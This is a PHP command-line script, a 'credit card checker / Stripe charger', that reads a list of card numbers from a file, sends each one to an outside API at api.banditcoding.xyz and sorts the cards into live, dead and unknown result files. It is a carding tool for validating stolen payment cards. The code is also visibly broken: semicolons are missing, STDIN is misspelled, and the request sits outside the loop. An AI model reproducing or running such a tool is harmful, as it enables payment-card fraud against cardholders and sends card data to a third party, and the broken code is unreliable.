<?php

// DONT CHANGE THIS

/*  ================[INFO]================
 *   AUTHOR  : ALPHA02
 *   SCRIPT  : CREDIT CARD CHECKER
 *   GITHUB  : https://github.com/AlphaOffi
 *   VERSION : 1 (CLI)
 *  ======================================
 */

//SETTING 

ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

$date = date("1, d-m-Y");

//BANNER

system("clear");
echo banner();

//INPUT LIST

enterlist:
echo "\n[+] Enter you list (eg: list.txt) >>";
$listname = trim(fgets(STIDIN));
if(empty($listname) || !file_exists($listname)) {
    echo " [!] Your Fucking list not found [!]".PHP_EOL;
    goto enterlist;
}

$list = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));;

echo "[?] Continuar ? (Y/n) >> ";
$q = trim(fgets(STIDIN));
$que = strtolower($q)
if($que == 'n') exit("\n[!] LABIL LU !? [!]\n\n");

//ACOUNT

$l = 0;
$d = 0;
$e = 0;
$u = 0;
$no = 0;
$total = count($list);
echo "\n[+] TOTAL $total lists [+]\n\n";

//LOOPING

foreach ($list as $list) {
    $no++;
    //API
    $url = "https://api.banditcoding.xyz/cc/v1/?cc=$list";
}

//CURL 

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url)
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)
$res = curl_exec($ch);
curl_close($ch);

//RESPONSE

if(strpos($res, '"status":"success"')){
   $l++;
    file_put_contents("result/live.txt", $list.PHP_EOL, FILE_APPEND);
    echo "[$no/$total] LIVE | $list | CREDIT CARD CHECKER \n";
}elseif(strpos($res, '"status":"failed"')){
    $d++;
    file_put_contents("result/die.txt", $list.PHP_EOL, FILE_APPEND);
    echo "[$no/$total] DIE | $list | CREDIT CARD CHECKER \n";
}elseif(strpos($res, '"status":"error"')){
    $u++;
    file_put_contents("result/unknown.txt", $list.PHP_EOL, FILE_APPEND);
    echo "[$no/$total] UNKNOWN | $list | CREDIT CARD CHECKER \n";
}elseif(strpos($res, "The server is temporarily busy, try again later!")){
    $e++;
    file_put_contents("result/error.txt", $list.PHP_EOL, FILE_APPEND);
    echo "[x] !!!SERVER BUSY!!! [x]\n";
}else{
    $e++;
    file_put_contents("result/error.txt", $list.PHP_EOL, FILE_APPEND);
    echo "[x] ERROR CONNECTION [x]\n";
     }

//END

echo "
DATE : $date
==========[INFO]==========
  TOTAL LIST : $total
  LIVE : $l
  DIE : $d
  UNKNOWN : $u
  ERROR : $e 
==========================
     GRACIAS POR USAR
";

function banner(){
    $banner = "
      __________  _______ _____________ _________ 
     / ___/ ___/ / ___/ // / __/ ___/ //_/ __/ _ \
    / /__/ /__  / /__/ _  / _// /__/ ,< / _// , _/
    \___/\___/  \___/_//_/___/\___/_/|_/___/_/|_| 
------------------------------------------------------
  AUTHOR  : ALPHA02
  VERSION : 1.0
  SCRIPT  : CREDIT CARD CHECKER STRIPE CHARGER
------------------------------------------------------
";
    return $banner;
}